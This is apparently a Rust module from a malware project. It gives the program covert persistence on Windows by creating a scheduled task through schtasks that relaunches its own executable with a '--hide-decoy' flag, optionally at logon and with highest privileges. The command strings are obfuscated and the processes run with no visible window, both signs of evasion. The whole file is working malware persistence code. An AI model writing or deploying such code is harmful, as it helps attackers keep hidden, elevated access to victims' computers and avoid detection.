use crate::config::Config;
use crate::utils::obfuscate::{args, exe};
use crate::log_debug;
use anyhow::{Context, Result};
use std::env;
use tracing::{error};

const CREATE_NO_WINDOW: u32 = 0x08000000;

pub async fn check_startup() -> Result<()> {
    let startup_config = Config::get_startup_config();

    if !startup_config.enabled {
        log_debug!("Startup persistence disabled");
        return Ok(());
    }

    let task_name = startup_config.task_name;

    log_debug!("Checking for task: {}", task_name);

    let schtasks_cmd = exe::schtasks();
    let query_output = tokio::process::Command::new(&schtasks_cmd)
        .args([
            args::query().as_str(),
            args::task_name().as_str(),
            task_name.as_str(),
        ])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .await
        .context("Failed to query scheduled task")?;

    if query_output.status.success() {
        log_debug!("Task '{}' already exists", task_name);
        return Ok(());
    }

    log_debug!("Creating task '{}'", task_name);
    log_debug!(
        "Task will trigger on: {}",
        if startup_config.on_logon {
            "LOGON"
        } else {
            "BOOT"
        }
    );
    log_debug!(
        "Privileges: {}",
        if startup_config.highest_privileges {
            "HIGHEST"
        } else {
            "NORMAL"
        }
    );

    let exe_path = env::current_exe().context("Failed to get executable path")?;

    log_debug!("Executable path: {}", exe_path.display());

    let exe_path_quoted = format!("\"{}\" --hide-decoy", exe_path.display());

    // Build args with obfuscated strings
    let create_arg = args::create();
    let tn_arg = args::task_name();
    let tr_arg = args::task_run();
    let force_arg = args::force();
    let sc_arg = args::schedule();
    let onlogon_arg = args::onlogon();
    let rl_arg = args::run_level();
    let highest_arg = args::highest();

    let mut cmd_args = vec![
        create_arg.clone(),
        tn_arg.clone(),
        task_name.to_string(),
        tr_arg.clone(),
        exe_path_quoted,
        force_arg.clone(),
    ];

    if startup_config.on_logon {
        cmd_args.push(sc_arg);
        cmd_args.push(onlogon_arg);
    }

    if startup_config.highest_privileges {
        cmd_args.push(rl_arg);
        cmd_args.push(highest_arg);
    }

    log_debug!("Running: {} {}", schtasks_cmd, cmd_args.join(" "));

    // Use tokio async command to avoid blocking the runtime
    let args_refs: Vec<&str> = cmd_args.iter().map(|s| s.as_str()).collect();
    let create_output = tokio::process::Command::new(&schtasks_cmd)
        .args(&args_refs)
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .await
        .context("Failed to execute schtasks")?;

    if !create_output.status.success() {
        let stderr = String::from_utf8_lossy(&create_output.stderr);
        let stdout = String::from_utf8_lossy(&create_output.stdout);
        error!("STDOUT: {}", stdout);
        error!("STDERR: {}", stderr);
        error!("Failed to create task '{}': {}", task_name, stderr);
        anyhow::bail!("Task creation failed: {}", stderr);
    }

    let stdout = String::from_utf8_lossy(&create_output.stdout);
    log_debug!("Task created successfully");
    log_debug!("Output: {}", stdout);

    Ok(())
}
